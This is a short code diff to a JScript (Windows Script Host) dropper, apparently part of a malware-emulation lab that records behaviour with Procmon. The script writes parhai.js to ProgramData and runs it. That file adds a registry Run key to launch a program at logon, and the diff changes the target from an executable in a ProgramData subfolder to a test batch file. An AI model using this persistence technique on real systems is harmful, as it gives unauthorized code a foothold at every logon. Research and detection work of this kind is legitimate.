@@ -52,7 +52,7 @@
       
       var ss = s.CreateTextFile("C://ProgramData//parhai.js", 2, true);
       // to record logs, run the procmon first
-      ss.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(1000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\Users\\\\fcastle\\\\Desktop\\\\Procmon.exe /BackingFile C:\\\\Users\\\\fcastle\\\\Desktop\\\\log\\\\tmp.PML /Quiet && C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');ss.Close();
+      ss.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(1000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\Users\\\\fcastle\\\\Desktop\\\\test\\\\thebat.bat","REG_SZ");');ss.Close();
       // ss.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(15000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');ss.Close();
       shell.run("C://ProgramData//parhai.js", 1);
       // reboot
